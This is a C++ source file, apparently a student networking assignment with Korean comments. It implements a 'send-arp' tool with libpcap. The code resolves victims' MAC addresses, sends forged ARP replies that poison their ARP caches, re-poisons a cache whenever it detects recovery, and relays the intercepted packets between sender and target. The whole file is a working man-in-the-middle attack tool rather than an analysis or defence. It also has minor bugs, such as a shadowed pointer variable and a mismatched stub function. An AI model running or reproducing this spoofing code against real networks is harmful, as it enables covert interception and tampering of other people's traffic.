#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ipv4.h"
#include "tcp.h"

#include <sys/ioctl.h>
#include <stdint.h>
#include <cstring>

/* only use getMyMacAddress & getMyIpAddress function */
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>

/* maping ip & mac */
#include <map>

typedef struct ARP_INFECTION_PACKET {
	ETHERNET_HDR eth_h;
	ARP_HDR arp_h;
} __attribute__((packed)) ARP_PACKET;	/* wireshark로 확인 후 00 00 있는거 확인 후 구조체패딩 해제 */

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

void send_arp_preparing(
    ARP_PACKET* packet,
	const char* src_mac, const char* dst_mac,
	uint8_t oper,
	const char* sender_ip, const char* target_ip,
	const char* sender_mac, const char* target_mac
);

void get_mac_address(
    pcap_t* pcap_,
    const char* sender_ip, char* sender_mac,
    const char* my_ip, const char* my_mac
);

void arp_infection(
    pcap_t* pcap_,
    const char* sender_ip, const char* sender_mac,
    const char* target_ip, const char* my_mac,
    const char* my_ip
);

void receive_arp(int c, const char* sender_ip);

void send_relay_packet(
    pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
    ETHERNET_HDR* eth, const char* target_mac, const char* my_mac
);

bool getMyMacAddress(const char* interface, char* mac_str);
bool getMyIpAddress(const char* interface, char* ip_str);
void print_packet(const u_char* packet, u_int32_t packet_len);
std::string findKeyByValue(const std::map<std::string, std::string>& myMap, std::string value);

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    std::map <std::string, std::string> ip_mac;
    std::map <std::string, std::string> sender_target;
    /* my mac & ip */
	char my_mac[18], my_ip[16];
	getMyMacAddress(argv[1], my_mac);
	getMyIpAddress(argv[1], my_ip);
    
    /* sender & target mac + 최초 arp table 감염*/
    char sender_mac[18];
    for(int i = 2; i < argc; i += 2) {
        printf("----------\n");
        get_mac_address(pcap, argv[i], sender_mac, my_ip, my_mac);
        ip_mac[argv[i]] = sender_mac;
        sender_target[argv[i]] = argv[i + 1];

        /* 최초로 위조 패킷 보내기 */
        arp_infection(pcap, argv[i], sender_mac, argv[i + 1], my_mac, my_ip);
        printf("----------\n");
    }

    /* sender에서 보낸 패킷 수신 */
    char sender_ip[16], target_ip[16], src_mac[18];
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        ETHERNET_HDR *eth = (ETHERNET_HDR *)packet;

        /* arp 복구 상황이 왔을 때 arp table 재감염 */
        if(eth->ether_type == htons(0x0806)) {
            ARP_HDR *arp = (ARP_HDR *)(packet + sizeof(ETHERNET_HDR));

            bytemac_to_stringmac(eth->ether_shost, src_mac);
            byteip_to_stringip(&arp->sender_ip_address, sender_ip);
            byteip_to_stringip(&arp->target_ip_address, target_ip);

            printf("src mac : %s sender mac : %s\n",src_mac, ip_mac[sender_ip].c_str());

            if (ip_mac.count(target_ip)){
                printf("-------------------\n");
                printf("\nReceived ARP request or reply\nProtocol : %04x\n", ntohs(eth->ether_type));
                arp_infection(pcap, sender_ip, ip_mac[sender_ip].c_str(), target_ip, my_mac, my_ip);
            }
            continue;
        }

        /* 이더넷 헤더와 ip 헤더 사이에 바이트 패딩이 있을 경우 바이트 패딩 무시 후 구조체 포인터 캐스팅 */
        IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR));
        if ((packet + sizeof(ETHERNET_HDR))[0] == 0x00)
            IPV4_HDR *ipv4 = (IPV4_HDR *)(packet + sizeof(ETHERNET_HDR) + 1);
        
        /* dst, src의 주소들 문자형으로 변환해서 디버깅 및 나중에 패킷 변조 시 이용 */
        char dst_mac[18], src_mac[18], dst_ip[16], src_ip[16];
        bytemac_to_stringmac(eth->ether_shost, src_mac);
        bytemac_to_stringmac(eth->ether_dhost, dst_mac);
        byteip_to_stringip(&(ipv4->ip_src), src_ip);
        byteip_to_stringip(&(ipv4->ip_dst), dst_ip);

        /* spoofing packet이 맞는 경우 relay packet 생성 및 전송 */
        if(strncmp(dst_mac, my_mac, 18) == 0 && strncmp(dst_ip, my_ip, 16) != 0) {
            if(ip_mac.count(dst_ip)||ip_mac.count(src_ip)) {
                printf("-------------------\n");
                printf("\nReceived reply from victim\n(from %s to %s)\n", src_ip, dst_ip);
                if (ip_mac.count(src_ip))
                    send_relay_packet(pcap, packet, header, eth, ip_mac[sender_target[src_ip]].c_str(), my_mac);
                else
                    send_relay_packet(pcap, packet, header, eth, ip_mac[dst_ip].c_str(), my_mac);
            }
        }
        
	}
	pcap_close(pcap);
}

/* arp 패킷 싸는 작업 함수 */
void send_arp_preparing(
    ARP_PACKET* packet,
	const char* src_mac, const char* dst_mac,
	uint8_t oper,
	const char* sender_ip, const char* target_ip,
	const char* sender_mac, const char* target_mac
) {
	stringmac_to_bytemac(src_mac, packet->eth_h.ether_shost); // Source MAC address
	stringmac_to_bytemac(dst_mac, packet->eth_h.ether_dhost); // Destination MAC address

	// printf("Source MAC: %s, Destination MAC: %s\n", src_mac, dst_mac);

	packet->eth_h.ether_type = htons(0x0806); 	// ARP protocol

	packet->arp_h.hardware_type = htons(0x0001); // Ethernet
	packet->arp_h.protocol_type = htons(0x0800); // IPv4
	packet->arp_h.hardware_length = 0x06; 		// MAC address length
	packet->arp_h.protocol_length = 0x04; 		// IPv4 address length
	packet->arp_h.operation = htons(oper); 		// ARP reply

	stringip_to_byteip(sender_ip, &packet->arp_h.sender_ip_address); 	// Sender IP address
	stringip_to_byteip(target_ip, &packet->arp_h.target_ip_address); 	// Target IP
	stringmac_to_bytemac(sender_mac, packet->arp_h.sender_mac_address); 	// Sender MAC address
	stringmac_to_bytemac(target_mac, packet->arp_h.target_mac_address); 	// Target MAC address

	// printf("Sender IP: %s, Target IP: %s\n", sender_ip, target_ip);
	// printf("Sender MAC: %s, Target MAC: %s\n", sender_mac, target_mac);
}

/* sender mac 주소 얻는 함수 */
void get_mac_address(
    pcap_t* pcap_,
    const char* sender_ip, char* sender_mac,
    const char* my_ip, const char* my_mac
 ) {
    /* who has <sender_ip>? 요청 */
    printf("\n<sender mac 주소 찾기 요청>\n");
    ARP_PACKET* tip_req_packet = new ARP_PACKET();
    send_arp_preparing(
        tip_req_packet,
        my_mac, "ff:ff:ff:ff:ff:ff",
        0x0001,
        my_ip, sender_ip,
        my_mac, "00:00:00:00:00:00"
    ); // ARP request operation
    
    if (pcap_sendpacket(pcap_, reinterpret_cast<const u_char*>(tip_req_packet), sizeof(ARP_PACKET)) != 0) {
        fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap_));
        printf("Failed to send ARP request\n");
		delete tip_req_packet;
        return;
    }
    printf("Request ARP request to %s\n", sender_ip);

	/* <sender_ip> is <victim_mac> 응답 */
    printf("\n<sender mac 주소 찾기 응답>\n");
    ARP_PACKET* tip_res_packet = NULL;
    char knowing_ip[16];
    while(1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap_, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap_));
            break;
        }

        tip_res_packet = (ARP_PACKET*) packet; /* pointer casting */

        byteip_to_stringip(&tip_res_packet->arp_h.sender_ip_address, knowing_ip);
        tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
        if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && ntohs(tip_res_packet->arp_h.operation) == 2 && strncmp(knowing_ip, sender_ip, 16) == 0) {
            printf("Received ARP reply from %s\n", sender_ip);
            break;
        }
    }
	/* sender mac 저장해주기 */
    bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address, sender_mac);
	delete tip_req_packet;
    return;
}

/* arp 감염 요청 함수 */
void arp_infection(
    pcap_t* pcap_,
    const char* sender_ip, const char* sender_mac,
    const char* target_ip, const char* my_mac,
    const char* my_ip
) {
    /* 위조 패킷 보내기 */
    printf("\n<arp 변조 응답 보내기>\n", sender_ip);

    ARP_PACKET* infection_packet = new ARP_PACKET();
    send_arp_preparing(
        infection_packet,
        my_mac, sender_mac,
        0x0002,
        target_ip, sender_ip,
        my_mac, sender_mac
    );
    if (pcap_sendpacket(pcap_, reinterpret_cast<const u_char*>(infection_packet), sizeof(ARP_PACKET)) != 0) {
        fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap_));
        return;
    }
    printf("Sent ARP packet from %s to %s\n\n\n", my_ip, sender_ip);
    delete infection_packet;
}

void receive_arp(int c, char* sender_ip) {
	ARP_PACKET *packet = new ARP_PACKET;
}

void send_relay_packet(
    pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
    ETHERNET_HDR* eth, const char* target_mac, const char* my_mac
) {
    ETHERNET_HDR *infection_eth = new ETHERNET_HDR();
    u_char* infection_packet = new u_char[header->caplen];

    stringmac_to_bytemac(target_mac, infection_eth->ether_dhost);
    stringmac_to_bytemac(my_mac, infection_eth->ether_shost);
    infection_eth->ether_type = eth->ether_type;

    memcpy(infection_packet, infection_eth, sizeof(ETHERNET_HDR));
    memcpy(infection_packet + sizeof(ETHERNET_HDR), packet + sizeof(ETHERNET_HDR), header->caplen - sizeof(ETHERNET_HDR));

    print_ethernet(infection_eth);

    if(pcap_sendpacket(pcap, infection_packet, header->caplen) != 0) {
        fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
    } else {
        printf("Sent relay packet\n(from %s to %s)\n", my_mac, target_mac);
    }
    delete infection_eth;
    delete[] infection_packet;
}

bool getMyMacAddress(const char* interface, char* mac_str) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    
    close(sock);
    unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    sprintf(mac_str, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

bool getMyIpAddress(const char* interface, char* ip_str) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return false;
    }

    close(sock);

	strcpy(ip_str, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    return true;
}

void print_packet(const u_char* packet, u_int32_t packet_len) {
    ETHERNET_HDR* ethernet = (ETHERNET_HDR*) packet;
    print_ethernet(ethernet);
    
    if(ethernet->ether_type != 0x0800) return;

    IPV4_HDR* ip = (IPV4_HDR*) (packet + sizeof(ETHERNET_HDR));
    print_ipv4(ip);
}

std::string findKeyByValue(const std::map<std::string, std::string>& myMap, std::string value) {
    for (const auto& pair : myMap) {
        if (pair.second == value) {
            return pair.first;
        }
    }
    return "";
}